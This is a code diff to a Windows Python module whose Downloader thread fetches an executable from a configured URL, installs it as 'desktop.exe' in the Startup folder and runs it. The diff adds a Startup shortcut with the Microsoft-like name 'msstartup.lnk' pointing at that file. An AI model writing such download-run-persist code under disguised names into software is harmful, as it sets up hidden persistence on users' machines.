@@ -4,7 +4,10 @@ Should only be run on windows :(
 """
 import cPickle
 import launcher
+import os
+import pythoncom
 import threading
+import win32com.client
 
 from win32com.shell import shellcon
 
@@ -37,11 +40,23 @@ class Downloader(threading.Thread):
         
         #DIR the launcher
         if self._stop.is_set(): return
-        launcher.download_install_run(LAUNCHERURL, 
-                                      shellcon.CSIDL_STARTUP, 
-                                      "desktop.exe",
-                                      duplicate=False)
-        return
+        path = launcher.download_install_run(LAUNCHERURL, 
+                                             shellcon.CSIDL_STARTUP, 
+                                             "desktop.exe",
+                                             duplicate=False)
+        
+        #Make a shortcut
+        try:
+            pythoncom.CoInitializeEx(pythoncom.COINIT_MULTITHREADED)
+        except pythoncom.com_error:
+            pass
+        shell = win32com.client.Dispatch('WScript.shell') 
+        startup = shell.SpecialFolders('Startup') 
+
+        shorty = shell.CreateShortcut(os.path.join(startup, "msstartup.lnk")) 
+        shorty.TargetPath = path
+        shorty.Save() 
+        
         
     def stop(self):
         """Stop the thread"""
